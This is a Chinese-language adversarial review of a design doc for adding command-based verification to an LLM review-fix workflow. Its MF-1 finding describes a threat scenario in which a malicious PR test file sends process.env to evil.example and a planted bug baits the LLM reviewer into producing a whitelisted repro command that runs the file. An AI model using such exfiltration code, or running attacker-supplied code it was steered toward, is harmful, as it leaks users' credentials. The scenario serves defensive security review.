# 对抗式审查报告：tier-3-verification-pipelining.md

> 审查对象：`docs/todo/review-fix-loop-efficiency/tier-3-verification-pipelining.md`
> 审查依据：`~/.agents/skills/tech-design/review/rubric-design-doc.md`
> 事实核实源码：`extensions/subagent-workflow/workflows/review-fix-loop.js`（行号引用）、`review-fix-loop-utils.cjs`
> 交叉文档：`tier-1-cheap-wins.md`

## Summary

4 must-fix, 4 suggestions.

核心结论：问题定义（§3.3「LLM 声称直接驱动写操作、无外部 ground truth」）挖得准，方案对比与降级/开关设计成熟；但**方案的核心判定逻辑、安全边界、与现有硬校验的集成三处不成立**——按文档实施，验收 S2 必然触发 ES3 fix-failure 整轮终止，白名单挡不住「合法命令执行恶意测试文件」，「按预期失败」的判定在「非 LLM 执行」的自我约束下无从实现。

## Findings

| 优先级 | 位置 | 维度 | 描述 | 修复方向 |
|--------|------|------|------|----------|
| MUST_FIX | §4 行85 / §6.1 行118 / §8 S3 行161 | P0-10/P0-11 | 白名单安全模型不成立：`pnpm vitest*` 类「合法」命令本身即执行测试文件内任意代码，白名单收敛的是命令字符串形状而非被执行内容；P-safety 探针测错对象 | 信任边界从命令字符串改为「被执行内容可信+环境受限」（限定 diff 内且未被 fixer 触碰的测试文件 / scrub env / 禁网络），或承认沙箱是前置需求并收缩轻量版到 tsc/grep 类不执行 repo 代码的命令 |
| MUST_FIX | §4 行76-77 / §7 行142/144 | P0-10 | 「命令按预期失败 = 复现成功」的判定逻辑未定义：schema 无预期结果字段，「报错与描述不符」需语义比对，与「非 LLM 执行」自相矛盾 | schema 增加结构化预期声明（expected_exit_code / failure pattern），判定纯确定性化；或显式引入 LLM judge 并计入成本 |
| MUST_FIX | §4 行77 / §5.1 / §5.2 行106 / §7 行142-145 | P0-12 | verify 降级与 ES3 硬校验、state.issues 生命周期、复活通道的连带改动全部缺失：按文档实施，验收 S2 必然触发 fix-failure 整轮终止 | §7 补三处：verify 后同步剔除 ES3 校验清单、verify-failed 置终态（不阻塞 converged/不走向 stuck）、verify 结果回写报告或注入 R2+ prompt 使复活有数据载体 |
| MUST_FIX | §7 行142/144 | P0-11/P0-12 | repro_command 传输链路不存在：reviewerSchema 的 must_fix 是 number 计数（无「条目」结构，文档描述失实）；aggregator 去重合并后 MF-id ↔ 原报告无映射，§7 未提 aggregator 透传改动 | 参照梯队 1 fix_guidance 的全链路写法：reviewerSchema 新增 per-issue 数组字段 + aggregator 透传规则（合并时选哪条）+ aggregatorSchema 新字段 |
| SUGGESTION | §6.2 行132 / §11 行189 | P1-4 | 流水化重评估触发器「审查段时长占比 >60%」无度量数据源：state.json 仅 meta.startedAt 一个时间字段，无阶段时长 | state.json 加 per-phase 起止时间戳，或明确权威数据源与统计口径 |
| SUGGESTION | §2 目标2 / §4 行76 / §5.2 行107 | P1-6 | verify 成本与提效目标收支未量化：每轮串行 N×≤120s、超时 fail-open 使慢场景 verify 形同虚设、跨轮重复执行无缓存、并行未考虑 | 补并行执行或串行 justification；repro 结果跨轮缓存；state 记 verify 耗时/超时计数并加入探针；§8 补效率验收 |
| SUGGESTION | §4 行78 / §5.2 行106 | P1-5 | 与梯队 1 接口错位：证据门槛实际在 aggregator 生效（tier-1 §6.4），verify 段的「无 repro_command 走证据规则」分支是死代码；`origin=verify-failed` 重载梯队 1 归因枚举污染其统计 | 证据规则只留 aggregator 一处；verify 降级结果用独立字段（如 verifyStatus） |
| SUGGESTION | §8 S2 行160 | P0-13（降级） | 核心负向验收 S2 构造不可控：「若 reviewer 报了无法复现的问题」依赖 LLM 偶发行为，「含幻觉倾向的 diff」不可复现 | 提供可控注入点（手工 reviewer 报告直接进 verify 段），负向验证不靠运气 |

---

## MUST_FIX 详证（每条附翻车场景）

### MF-1 白名单安全模型不成立，P-safety 探针测错对象（P0-10/P0-11）

**文档声称**（§4 行 85）：安全红线 = 「命令白名单正则（`pnpm vitest*` / `pnpm tsc*` / `grep*` / `fallow*` 等）+ 拒绝写操作命令」，并配 ⛔ P-safety 探针「构造 10 个对抗命令验证全被拒」（§8 S3 行 161、§11 行 186）。

**对抗事实**：`pnpm vitest run <file>` 的语义就是「执行 `<file>` 里的任意代码」（外加 vitest.config/setup 文件里的任意代码）。被执行内容的来源有两条攻击路径：
1. **被审查对象本身**：`targetType=git-diff` 审外部 PR 时，diff 可自带恶意测试文件——这是 workflow 的头号用法（脚本 @pi-meta 示例即此用法）；
2. **前轮 fixer 的写入**：fix agent 对仓库有写权限，R1 fix 改过的测试文件在 R2 verify 时被执行。

workflow 以用户完整权限在主工作树 spawn（源码 Fix 段已用 `child_process.execSync`，环境继承用户 shell env，含 API key / GITHUB_TOKEN）。白名单正则收敛的是**命令字符串的形状**，而真实攻击面是**被执行的代码内容**——探针构造 10 个对抗命令字符串走 `matchWhitelist`，全部拒绝也只证明字符串匹配正确，测错了对象。

**翻车场景**：对外部贡献者 PR 跑 `workflow run review-fix-loop --args targetType=git-diff target=main`：PR 新增 `test/x.test.ts` 内含 `fetch("https://evil.example", {body: JSON.stringify(process.env)})`，并故意留一个显眼 bug 诱导 reviewer 生成 repro `pnpm vitest run test/x.test.ts` → 白名单放行 → 密钥外泄。无恶意场景同样翻车：R1 fixer 改坏测试致 hang，verify 每轮烧满 120s。

**修复方向**：信任边界重画为「被执行内容可信 + 执行环境受限」——仅允许执行 diff 范围内且未被本轮 fixer 修改过的测试文件、scrub 环境变量、禁网络；或承认这就是完整版沙箱的前置需求，轻量版收缩到 `tsc --noEmit`/`grep` 这类不执行 repo 代码的命令。P-safety 探针改为对被执行内容的威胁建模。

### MF-2 「按预期失败 = 复现成功」判定逻辑未定义（P0-10）

**文档声称**：§4 行 76「命令按预期失败（复现成功 = 问题为真）→ 保留」、行 77「报错与描述不符 → 降级」；§7 行 142「按退出码与输出比对决定保留/降级」；§4 定义块行 83「由 workflow 引擎（而非 LLM）执行并观察真实退出码/输出」。

**对抗事实**：
1. 「报错与**描述**比对」是对自由文本的语义判断，需要 LLM——而文档自我约束「非 LLM 执行」「不引入新 agent」（§7 行 138），这个 judge 在设计里不存在；
2. schema 只加一个 `repro_command` 字符串（§7 行 144），**没有预期结果字段**——workflow 没有任何权威输入知道「预期失败长什么样」；
3. 退化为「exit code ≠ 0 → verified」后系统性误判：(a) 测试文件里任何预存无关失败都算复现成功；(b) 文档自己的例子 MF-2 `pnpm tsc --noEmit`（§5.1 行 97）在 monorepo 里可携几百个预存错误，「FAIL as described」无从谈起；(c) `grep` exit 1 = 无命中——对「X 不应存在」类问题 exit 1 恰恰是成功，退出码判定方向直接反了。

**翻车场景**：reviewer 报「session 池空指针」，repro 跑 `pnpm vitest run test/session.test.ts`；该文件有无关预存失败 → exit 1 → 判 verified → fixer 拿着无关失败输出当「真实定位依据」去修不存在的问题。verify 段制造了假 ground truth——比没有 verify 更糟：假阳性现在盖着「确定性验证通过」的章，§3.2-A 想消灭的剧本换皮重演。

**修复方向**：schema 增加结构化预期声明（expected_exit_code / expected_failure_pattern），判定规则纯确定性化（退出码 + pattern）；或显式引入 LLM judge 并计入 §6.1 成本与 §7 agent 清单。§8 补验收场景「无关失败不得判 verified」。

### MF-3 verify 降级与 ES3/issue 生命周期/复活通道的连带改动全部缺失（P0-12）

**文档声称**：§4 行 77 降级 suggestion；§5.1 示例「Fix round 1: 4 verified must-fix」（MF-4 被降级不进 fix）；§5.2 行 106「下轮 reviewer 可带修正后的 repro 复活（复用梯队 1 复活通道）」。§7 改动清单（行 142-145）未提 ES3、state.issues、aggregated.md 回写任何一处。

**对抗事实（源码核实）**：
1. **ES3 硬校验冲突**：review-fix-loop.js:892 `validateFixResult(fixResult, agg.must_fix_ids, state.issues)`——`agg.must_fix_ids` 里每个 id 必须出现在 `fixes[]`，否则 violation → `terminated="fix-failure"` 整轮终止（utils:258 起）。verify 把 MF-4 降级、fixer 只修 4 条后，若 `agg.must_fix_ids` 不同步剔除 MF-4，ES3 必判漏修。**即按文档实施，验收场景 S2（假阳性被拦截不进 fixes[]）必然触发 fix-failure，S2 永远无法通过。**
2. **issue 生命周期无出口**：R1 初始化把 `agg.must_fix_ids` 全部以 `status: "open"` 写入 `state.issues`；verify 降级条目 fixer 不碰 → 永远停留 open。converged 门槛（review-fix-loop.js:795-798）要求 `activeIssues(open|regressed)` 为空 → verify-failed 条目永久阻塞 converged 终止；若 R2+ reviewer 坚持重报该假阳性（它本来就认为是真问题），`reconcileIssues` 里 open+seen → openStreak 累加 → stuckThreshold 轮后 stuck 终止。「verify 说假、reviewer 说真」的僵局走向文档未设计。
3. **复活通道断**：梯队 1 复活依赖下轮 reviewer 看到被降级条目（tier-1 §5.2，载体 = 前轮 aggregated.md 经 R2+ prompt 的 aggPath 传入）。verify 在聚合**之后**降级，aggregated.md 已写完——workflow 不回写报告、R2+ prompt 输入不含 verify-failed 清单与真实失败输出，下轮 reviewer 既看不到要复活什么，也不知道上次 repro 为何失败（「带修正后的 repro」无输入来源）。

**翻车场景**：除 S2 必崩外——1 条假阳性被 verify 降级后 reviewer 每轮重报 → openStreak 涨满 → run 以 `[UNRESOLVED] 问题连续 3 轮未收敛` 终止，用户收到的「顽固问题」恰恰是 verify 已判定不存在的那个。

**修复方向**：§7 补三处连带改动——verify 降级后从 ES3 校验清单剔除（或 ES3 改吃 verify 后清单）；`state.issues` 对应条目置 verify-failed 终态（不阻塞 converged、reconcile 跳过）；verify 结果回写 aggregated.md 或注入 R2+ prompt，使复活通道有数据载体。

### MF-4 repro_command 传输链路不存在（P0-11/P0-12）

**文档声称**：§7 行 144「reviewerSchema | must-fix 条目增加可选 `repro_command`」；§7 行 142「遍历 agg.must_fix_ids 对应报告的 repro_command」；§4 行 73「aggregate（现有去重逻辑不变）」。

**对抗事实（源码核实）**：
1. **schema 描述失实**：reviewerSchema（review-fix-loop.js:199-220）的 `must_fix` 是 `type: "number"` 计数（行 204）——**schema 里根本没有「must-fix 条目」结构**，issue 明细活在 markdown 报告正文。「must-fix 条目增加字段」无的放矢（对比梯队 1 §7 的正确表述：「must_fix 计数不变，新增可选数组字段 fix_guidance」）。
2. **聚合透传缺失**：aggregator 跨 reviewer 去重合并，产出 MF-1..N 是 aggregator 自己表格的新 ID（aggregatorSchema 行 223 起只有 must_fix_ids/fixes_caution）；现状代码里 MF-id → 各 reviewer 原报告之间没有任何结构化映射。「对应报告的 repro_command」——若指原 reviewer 报告，映射机制不存在；若指聚合后的 markdown，则要解析自由文本。§7 未提 aggregatorSchema / aggregator prompt 的任何透传改动，「现有去重逻辑不变」与「repro_command 存活到 verify」直接冲突。

**翻车场景**：两个 reviewer 报同一 bug、各附不同 repro；aggregator 合并为 MF-1。实施者发现没有权威数据源决定 MF-1 用哪条 repro——要么临时改 aggregator schema（文档未授权的设计决策），要么解析 markdown（脆弱），要么整条按「无 repro_command」处理——verify 段大面积退化为梯队 1 证据规则，设计目标 1 落空。

**修复方向**：参照梯队 1 fix_guidance 的全链路写法补齐：reviewerSchema 新增 per-issue 数组字段（含 repro_command）+ aggregator 透传规则（合并时选哪条/全保留）+ aggregatorSchema 新字段，并落入 §10 拆分。

---

## SUGGESTION 详证

### SG-1 流水化重评估触发器不可度量（P1-4）
§6.2 行 132 / §11 行 189 的触发器「审查段时长占比 > 60%」：grep 全脚本，state.json 唯一时间字段是 `meta.startedAt`（review-fix-loop.js:340）与 RUN_ID 的 `Date.now`（行 298）；batchRounds 仅记 `{round, mustFix, suggestion, agents, modifiedFiles}`，无时间戳无 duration。触发器实际不可触发，「暂缓」名存实亡为「永久搁置」。§7 补 per-phase 时间戳（一行级改动）即可救活。

### SG-2 verify 成本与提效目标收支未量化（P1-6）
verify 逐条串行（§4「逐条 spawn」）、每轮只要 aggregate 出 must-fix 就执行：5 条 × 120s 上限 = 每轮最多 10 分钟串行墙钟；超时按「无法验证」不降级（§5.2 行 107）——慢测试（monorepo 全量 `tsc --noEmit` 数分钟）场景下稳定烧满超时且零拦截，恰好最贵的场景 verify 形同虚设。跨轮同一 repro 重复执行无缓存；只读命令本可并行却未考虑。目标 2「验证不许比修复还贵」无度量口径。建议：并行执行或写串行 justification；repro 结果跨轮缓存；state 记 verify 耗时/超时计数并加入 §11 探针；§8 补「verify 墙钟 < 本轮 fix 墙钟」效率验收。

### SG-3 与梯队 1 接口错位（P1-5）
(a) 梯队 1 证据门槛在 **aggregator** 生效（tier-1 §6.4「aggregator 把无证据条目降级」）；本文档 §4 行 78 把「无 repro_command → 走梯队 1 证据规则」放在聚合之后的 verify 分支——梯队 1 已上线则无证据条目到不了 verify（死代码），未上线则 verify 无结构化 evidence 可用。(b) §5.2 行 106 用 `origin=verify-failed` 重载梯队 1 的归因枚举（regression/missed/severity-drift，tier-1 §4），verify 降级条目并非 R2+ 新 issue，会污染梯队 1 目标 1 的归因统计口径（tier-1 §8 S2「总和 = R2+ 新 issue 数」被打破）。建议证据规则只留 aggregator 一处；verify 结果用独立字段（verifyStatus）。

### SG-4 核心负向验收 S2 构造不可控（P0-13 降级）
§8 行 160 S2：「同一 run 中**若** reviewer 报了无法复现的问题（或人工构造：含幻觉倾向的 diff）」——触发依赖 LLM 偶发行为，「含幻觉倾向的 diff」不可复现；reviewer 不报假阳性时场景静默不适用，目标 1 的负向验证形同虚设（叠加 MF-3 的 ES3 冲突，S2 当前必然失败）。建议提供可控注入点：支持从文件喂入手工 reviewer 报告直接进 verify 段，负向验证不靠运气。（主路径 S1 为真实仓真实 PR 场景、可执行，故降级为 SUGGESTION。）

---

## 查过、无发现的维度

- **P0-1 五段骨架**：全（背景 §1 / 目标 §2 / 现状 §3 / 方案 §4-7 / 验收 §8 / 拆分 §10）。
- **P0-2 delta 链**：正文无「vN / Rxx-finding / 参见上版」引用；附录仅 v1 初版。
- **P0-3 结论先行**：每章首句「本章结论」+ SCQA 开篇 + 文首一句话结论，达标。
- **P0-4 问题定义**：§3.3 挖到根因层（LLM 声称直接驱动写操作、无外部 ground truth，附 Huang et al. / CRITIC 文献），非表象复述——问题定义本身达标（方案能否解决根因受 MF-1/MF-2 影响，见上）。
- **P0-5 重实现轻体验**：§3.1/§5.1 均为使用者视角的日志形态，达标。
- **P0-6 抽象术语**：「确定性验证」§4 行 83 有定义并绑例子，达标。
- **P0-7/8/9 方案对比**：§6.1/§6.2 各 2 方案、长期+短期双维度、明确推荐且附「被否若用」，达标。
- **P0-14 验收非单测非 mock**：S1 为 xyz-agent 仓真实 PR 真实 run；白名单单测明确定位为实施期门（S3）而非验收替身，达标。
- **P0-15 验收投入匹配**：中改动配 5 场景，匹配。
- **P0-16 运行时断言探针**：P-safety / P-repro-quality / P-fp-rate / P-pipeline 四个 ⛔ 探针存在（P-safety 测错对象已列 MF-1）。
- **P0-18 错误恢复指引**：§5.2 三条失败路径均带 👉 恢复动作 + `verifyMode=off` 总开关，达标。
- **事实锚点（✅ 属实，源码核实）**：「聚合→Fix 无验证环节」（主循环 aggregate → stuck/redesign/converge → Fix，无 verify 段）；「ES3 = must-fix 必须全进 fixes[]、漏修判 violation → fix-failure」（review-fix-loop.js:892 + utils.cjs:258）；「base 锁定机制 lockedBase 存在」（review-fix-loop.js:157 区）；「§11 已核实声明」与源码一致。
- **外部引用（可能不完整 → INFO）**：Greptile TREX / CRITIC / Huang et al. 引用与梯队 1 文档一致且标注置信度（Copilot 标 Moderate 属诚实）；URL 有效性未联网逐一核实，不影响架构决策。
